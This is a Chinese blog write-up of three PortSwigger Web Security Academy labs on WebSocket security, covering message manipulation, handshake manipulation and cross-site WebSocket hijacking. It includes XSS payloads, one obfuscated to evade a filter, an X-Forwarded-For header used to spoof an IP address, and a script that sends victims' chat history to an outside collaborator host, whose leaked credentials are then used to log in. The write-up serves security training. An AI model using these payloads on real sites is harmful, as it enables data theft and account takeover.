# 原创
：  【burpsuite安全练兵场-客户端16】测试WebSockets安全漏洞-3个实验（全）

# 【burpsuite安全练兵场-客户端16】测试WebSockets安全漏洞-3个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

 

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）测试WebSockets安全漏洞（√）
（2）操纵WebSocket流量（√）
（3）跨站点WebSocket劫持（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、测试WebSockets安全漏洞](#%E4%B8%80%E3%80%81%E6%B5%8B%E8%AF%95WebSockets%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E)

[1、网络套接字](#1%E3%80%81%E7%BD%91%E7%BB%9C%E5%A5%97%E6%8E%A5%E5%AD%97)

[2、HTTP和WebSockets区别](#2%E3%80%81HTTP%E5%92%8CWebSockets%E5%8C%BA%E5%88%AB)

[3、建立WebSocket连接](#3%E3%80%81%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5)

[4、WebSocket消息外观](#4%E3%80%81WebSocket%E6%B6%88%E6%81%AF%E5%A4%96%E8%A7%82)

[二、操纵WebSocket流量](#%E4%BA%8C%E3%80%81%E6%93%8D%E7%BA%B5WebSocket%E6%B5%81%E9%87%8F)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、拦截和修改WebSocket消息](#2%E3%80%81%E6%8B%A6%E6%88%AA%E5%92%8C%E4%BF%AE%E6%94%B9WebSocket%E6%B6%88%E6%81%AF)

[3、重放和生成新的WebSocket消息](#3%E3%80%81%E9%87%8D%E6%94%BE%E5%92%8C%E7%94%9F%E6%88%90%E6%96%B0%E7%9A%84WebSocket%E6%B6%88%E6%81%AF)

[4、操作WebSocket连接](#4%E3%80%81%E6%93%8D%E4%BD%9CWebSocket%E8%BF%9E%E6%8E%A5)

[5、WebSockets安全漏洞](#5%E3%80%81WebSockets%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E)

[6、操纵WebSocket消息以利用漏洞](#6%E3%80%81%E6%93%8D%E7%BA%B5WebSocket%E6%B6%88%E6%81%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%93%8D%E7%BA%B5WebSocket%E6%B6%88%E6%81%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)[实验1：操纵WebSocket消息以利用漏洞](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%93%8D%E7%BA%B5WebSocket%E6%B6%88%E6%81%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)

[7、操纵WebSocket握手以利用漏洞](#7%E3%80%81%E6%93%8D%E7%BA%B5WebSocket%E6%8F%A1%E6%89%8B%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%93%8D%E7%BA%B5WebSocket%E6%8F%A1%E6%89%8B%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)[实验2：操纵WebSocket握手以利用漏洞](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%93%8D%E7%BA%B5WebSocket%E6%8F%A1%E6%89%8B%E4%BB%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E)

[三、跨站点WebSocket劫持](#%E4%B8%89%E3%80%81%E8%B7%A8%E7%AB%99%E7%82%B9WebSocket%E5%8A%AB%E6%8C%81)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响](#2%E3%80%81%E5%BD%B1%E5%93%8D)

[3、执行跨站点WebSocket劫持攻击](#3%E3%80%81%E6%89%A7%E8%A1%8C%E8%B7%A8%E7%AB%99%E7%82%B9WebSocket%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E8%B7%A8%E7%AB%99%E7%82%B9WebSocket%E5%8A%AB%E6%8C%81)[实验3：跨站点WebSocket劫持](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E8%B7%A8%E7%AB%99%E7%82%B9WebSocket%E5%8A%AB%E6%8C%81)

---


## 一、测试WebSockets安全漏洞

> 
<h3>1、网络套接字</h3>
1、WebSockets：通过HTTP发起的双向全双工通信协议。它们通常在现代Web应用程序中用于流数据和其他异步流量


> 
<h3>2、HTTP和WebSockets区别</h3>
1、HTTP：Web浏览器和网站之间的大多数通信都使用HTTP。使用HTTP时，客户端发送请求，服务器返回响应。通常，响应会立即发生，并且事务完成。即使网络连接保持打开，这也将用于请求和响应的单独事务
<hr/>
2、WebSockets：一些现代网站使用WebSockets。WebSocket连接是通过HTTP发起的，通常是长期的。消息可以在任何时候以任一方向发送，本质上不是事务性的。在客户端或服务器准备好发送消息之前，连接通常会保持打开和空闲状态
<hr/>
3、优势：WebSockets在需要低延迟或服务器启动的消息的情况下特别有用，例如财务数据的实时馈送。 


---


> 
<h3>3、建立WebSocket连接</h3>
1、WebSocket连接通常使用客户端JavaScript创建，
<pre><code>示例：
var ws = new WebSocket("wss://normal-website.com/chat");</code></pre>
<hr/>
2、为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。
<pre><code>1、浏览器发出如下WebSocket握手请求：
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

2、如果服务器接受连接，它将返回WebSocket握手响应，如下所示：
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=</code></pre>
此时，网络连接保持打开状态，可用于向任一方向发送WebSocket消息。 
<hr/>
3、WebSocket握手消息的几个特性：
<pre><code>    1、请求和响应中的Connection和Upgrade标头指示这是WebSocket握手。
    2、Sec-WebSocket -Version请求头指定客户端希望使用的WebSocket协议版本。这通常是13。
    3、Sec-WebSocket -Key请求标头包含Base64编码的随机值，该值应在每个握手请求中随机生成。
    4、该 Sec-WebSocket-接受 响应标头包含在 Sec-WebSocket-密钥请求报头，与协议规范中定义的特定字符串连接。这样做是为了防止错误配置的服务器或缓存代理导致误导性响应</code></pre>



---


> 
<h3>4、WebSocket消息外观</h3>
1、一旦建立了WebSocket连接，客户端或服务器就可以在任意方向上异步发送消息。
<hr/>
2、可以使用客户端JavaScript从浏览器发送一条简单的消息
<pre><code>示例：
ws.send("Peter Wiener");</code></pre>
<hr/>
3、原则上，WebSocket消息可以包含任何内容或数据格式。在现代应用程序中，JSON通常用于在WebSocket消息中发送结构化数据。
<pre><code>例如，使用WebSockets的聊天机器人应用程序可能会发送如下消息：
{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}</code></pre>


---


---


---


## 二、操纵WebSocket流量

> 
<h3>1、简述：</h3>
1、查找WebSockets安全漏洞通常涉及以应用程序不期望的方式操作它们。可以使用Burp Suite完成此操作
<hr/>
2、可以使用Burp Suite：拦截和修改WebSocket消息、重放并生成新的WebSocket消息、操作WebSocket连接。


> 
<h3>2、拦截和修改WebSocket消息</h3>
基本操作：
1、可以使用Burp代理拦截和修改WebSocket消息
<pre><code>示例：
    1、打开Burp的浏览器
    2、浏览到使用WebSockets的应用程序函数。您可以通过使用应用程序并查找Burp Proxy内WebSockets历史记录选项卡中显示的条目来确定WebSockets是否正在使用。
    3、在Burp Proxy的Intercept选项卡中，确保拦截功能已打开。
    4、当WebSocket消息从浏览器或服务器发送时，它将显示在“拦截”选项卡中，供您查看或修改。按“转发”按钮转发消息。</code></pre>
可以配置是否在Burp Proxy中拦截客户端到服务器或服务器到客户端消息。在"选项"选项卡中执行此操作，该选项卡位于 拦截WebSocket消息选项。


> 
<h3>3、重放和生成新的WebSocket消息</h3>
基本操作：
1、除了动态拦截和修改WebSocket消息之外，还可以重放单个消息并生成新消息。可以使用打BP repeater来完成此操作
<hr/>
2、如果想编辑和重新发送历史记录面板中的任何邮件，您可以通过选择该邮件并从上下文菜单中选择“编辑和重新发送”来完成此操作。


> 
<h3>4、操作WebSocket连接</h3>
基础操作
1、除了操纵WebSocket消息之外，有时还需要操纵建立连接的WebSocket握手。
<pre><code>在各种情况下，可能需要操作WebSocket握手：
1、它可以使你到达更多的攻击面。
2、某些攻击可能会导致您的连接断开，因此您需要建立一个新的连接。
3、原始握手请求中的令牌或其他数据可能已过时，需要更新。</code></pre>
2、可以使用Burp Repeater操作WebSocket握手：
<pre><code>    1、将WebSocket消息发送到BP repeater
    2、在Burp Repeater中，单击WebSocket URL旁边的铅笔图标。这将打开一个向导，允许您附加到现有的已连接WebSocket、克隆已连接WebSocket或重新连接到已断开连接的WebSocket。
    3、如果选择克隆已连接的WebSocket或重新连接到已断开连接的WebSocket，则向导将显示WebSocket握手请求的完整详细信息，可以在执行握手之前根据需要编辑这些详细信息。
    4、当您点击“连接”时，Burp将尝试执行配置的握手并显示结果。如果成功建立了新的WebSocket连接，则可以使用此连接在Burp Repeater中发送新消息。</code></pre>


> 
<h3>5、WebSockets安全漏洞</h3>
1、原则上，几乎所有Web安全漏洞都可能与WebSockets相关：
<pre><code>    1、传输到服务器的用户提供的输入可能会以不安全的方式进行处理，从而导致SQL注入或XML外部实体注入等漏洞。
    2、某些通过WebSockets攻击的隐蔽漏洞可能只能使用带外（OAST）技术检测。
    3、如果攻击者控制的数据通过WebSockets传输给其他应用程序用户，则可能导致XSS或其他客户端漏洞。</code></pre>


> 
<h3>6、操纵WebSocket消息以利用漏洞</h3>
1、大多数影响WebSocket的基于输入的漏洞都可以通过篡改WebSocket消息的内容来发现和利用。
<pre><code>示例：
1、假设聊天应用程序使用WebSockets在浏览器和服务器之间发送聊天消息。当用户键入聊天消息时，将向服务器发送如下所示的WebSocket消息：
{"message":"Hello Carlos"}

2、消息的内容被传输（再次通过WebSockets）给另一个聊天用户，并在用户的浏览器中呈现如下：
&lt;td&gt;Hello Carlos&lt;/td&gt;

3、在这种情况下，如果没有其他输入处理或防御措施，攻击者可以通过提交以下WebSocket消息来执行概念验证XSS攻击：
{"message":"&lt;img src=1 onerror='alert(1)'&gt;"}</code></pre>
<hr/>
2、涉及实验：
实验1：操纵WebSocket消息以利用漏洞



> 
<h3>实验1：操纵WebSocket消息以利用漏洞</h3>
信息：
1、网上商店有一个使用WebSockets实现的实时聊天功能
2、提交的聊天消息将由支持代理真实的查看。
3、解决实验：使用WebSocket消息在支持代理的浏览器中触发alert()弹出窗口
<hr/>
part1：
单击“实时聊天”并发送聊天消息，在Burp Proxy中，转到WebSockets历史记录选项卡，观察聊天消息是否已通过WebSocket消息发送



使用浏览器发送包含"&lt;"字符的新邮件；在Burp Proxy中，找到相应的WebSocket消息，并观察到"&lt;"在发送之前已经由客户端进行了HTML编码

<hr/>
part2： 
插入payload
编辑拦截的消息以包含以下有效负载：
<pre>`&lt;img src=1 onerror='alert(1)'&gt;`</pre>
我先输入的1，然后抓包修改为payload



观察浏览器中触发了alter函数，完成实验




---


> 
<h3>7、操纵WebSocket握手以利用漏洞</h3>
1、某些WebSockets漏洞只能由 操纵WebSocket握手。这些漏洞往往涉及设计缺陷
<pre><code>示例：
1、错误地信任HTTP标头（如X-Forwarded-For标头）来执行安全决策。
2、会话处理机制中的缺陷，因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文确定。
3、由应用程序使用的自定义HTTP标头引入的攻击面。</code></pre>
<hr/>
2、涉及实验：
实验2：操纵WebSocket握手以利用漏洞


> 
<h3>实验2：操纵WebSocket握手以利用漏洞</h3>
信息：
1、网上商店有一个使用WebSockets实现的实时聊天功能
2、它有一个激进但有缺陷的XSS过滤器。
3、解决实验：使用WebSocket消息在支持代理的浏览器中触发alert()弹出窗口
<hr/>
part1：
单击"实时聊天"并发送聊天消息。在Burp Proxy中，转到WebSockets历史记录选项卡，观察聊天消息是否已通过WebSocket消息发送。


右键单击邮件并选择"发送到中继器"（老版的如果不能发送到repeater，就直接拦截一次改一次）
<hr/>
part2：
编辑并重新发送包含基本XSS有效负载的消息
<pre>`&lt;img src=1 onerror='alert(1)'&gt;`</pre>
注意到攻击已被阻止，并且WebSocket连接已终止
<img alt="" height="883" src="https://img-blog.csdnimg.cn/cb5da32def6749fd8f08c24725d00bbf.png" width="1200"/><br/> 单击“重新连接”，并观察到连接尝试失败，因为您的IP地址已被禁止


<hr/>
part2：
将以下标头添加到握手请求以欺骗您的IP地址：
<pre>`X-Forwarded-For: 1.1.1.1`</pre>
（老版的bp实在不能继续用下去了，换版本）

单击“连接”成功重新连接WebSocket
 <img alt="" height="907" src="https://img-blog.csdnimg.cn/b7db07f1c2d447a1870f87bb89f2cf2a.png" width="1200"/>

<hr/>
part3：
发送包含模糊XSS有效负载的WebSocket消息，例如：
<pre>`&lt;img src=1 oNeRrOr=alert`1`&gt;`</pre>
应该是被前端过滤器拦截编码了，在BP中修改重发，就解决了

 <img alt="" height="997" src="https://img-blog.csdnimg.cn/9c83b3d3815143178dde6e07f1f75921.png" width="1200"/>
 完成实验




---


---


---


---


## 三、跨站点WebSocket劫持

> 
<h3>1、简述：</h3>
1、跨站点WebSocket劫持（也称为跨源WebSocket劫持）涉及 跨站点请求伪造 （CSRF）上的漏洞 WebSocket握手。当WebSocket握手请求仅依赖HTTP cookie进行会话处理，并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。
<hr/>
2、攻击者可以在自己的域中创建恶意网页，从而建立到易受攻击的应用程序的跨站点WebSocket连接。应用程序将在受害用户与应用程序的会话的上下文中处理连接；
然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接收回的消息内容。这意味着，与常规CSRF不同，攻击者获得了与受损应用程序的双向交互。 


> 
<h3>2、影响</h3>
1、成功的跨站点WebSocket劫持攻击通常可让攻击者：
<pre><code>    1、伪装成受害用户执行未经授权的操作。与常规CSRF一样，攻击者可以向服务器端应用程序发送任意消息。如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成适当的消息并触发这些操作。
    2、检索用户可以访问的敏感数据。与常规CSRF不同，跨站点WebSocket劫持使攻击者能够通过被劫持的WebSocket与易受攻击的应用程序进行双向交互。如果应用程序使用服务器生成的WebSocket消息向用户返回任何敏感数据，则攻击者可以拦截这些消息并捕获受害用户的数据。</code></pre>


> 
<h3>3、执行跨站点WebSocket劫持攻击</h3>
1、由于跨站点WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手，并确定它们是否受到CSRF保护。
<hr/>
2、就 CSRF攻击的正常情况而言，通常需要找到一个握手消息，该消息仅依赖于HTTP cookie进行会话处理，并且在请求参数中不使用任何令牌或其他不可预测的值。
<pre><code>示例：
以下WebSocket握手请求可能易受CSRF攻击，因为唯一的会话令牌是在Cookie中传输的：
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

注：
Sec-WebSocket-Key标头包含一个随机值，以防止缓存代理出错，并且不用于身份验证或会话处理目的</code></pre>
<br/>  
<hr/>
3、如果WebSocket握手请求易受CSRF攻击，则攻击者的网页可以执行跨站点请求以打开易受攻击站点上的WebSocket。攻击中接下来会发生什么完全取决于应用程序的逻辑及其使用 网络套接字。
<pre><code>攻击可能涉及：
1、发送WebSocket消息以代表受害用户执行未经授权的操作。
2、发送WebSocket消息以检索敏感数据。
3、有时候，只是等待包含敏感数据的传入消息到达
</code></pre>
<hr/>
4、涉及实验：
实验3：跨站点WebSocket劫持



---


> 
<h3>实验3：跨站点WebSocket劫持</h3>
信息：
1、网上商店有一个使用WebSockets实现的实时聊天功能
2、解决实验：使用漏洞攻击服务器托管HTML/JavaScript有效负载，该有效负载使用跨站点WebSocket劫持攻击来泄露受害者的聊天历史记录，然后使用此有效负载访问受害者的帐户
<hr/>
part1：
单击"实时聊天"并发送聊天消息，重新加载页面<br/> 在Burp代理的WebSockets历史选项卡中，观察"READY"命令从服务器检索过去的聊天消息
<img alt="" height="997" src="https://img-blog.csdnimg.cn/63813c62ed9c4fa08d14cdcbb000b90c.png" width="1200"/><br/> 在Burp代理的HTTP历史记录选项卡中，找到WebSocket握手请求。观察请求是否没有CSRF令牌
 右键单击握手请求并选择"复制URL"



<hr/>
part2：
在浏览器中，转到利用漏洞攻击服务器并将以下模板粘贴到"Body"部分：
<pre><code>&lt;script&gt;
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;

我的是：
&lt;script&gt;
    var ws = new WebSocket('wss://0a390011034ce37ac4128868009b005e.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://bhwr3j502kct2ljwwrtofzi68xeo2d.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;</code></pre>
将自己的网络套接字url替换为网络套接字握手中的URL（实验室ID）。确保将协议从https://更改为wss://。用Burp Collaborator客户端生成的有效负载替换your-collaborator-url

<pre>`bhwr3j502kct2ljwwrtofzi68xeo2d.oastify.com`</pre>




单击“查看漏洞利用”（view）


 在Collaborator选项卡中轮询交互。验证攻击是否已成功检索您的聊天历史记录并通过Burp Collaborator将其泄露
对于聊天中的每一条消息，Burp Collaborator都接收到一个HTTP请求。请求正文包含JSON格式的聊天消息的全部内容（这些消息的接收顺序可能不正确）

 检查这些消息，其中一条消息包含受害者的用户名和密码
<pre><code>carlos
i0h9n4jqwxg3qeqxbfzy</code></pre>

<hr/>
part3：
使用溢出的凭据登录受攻击用户的帐户
完成实验




---

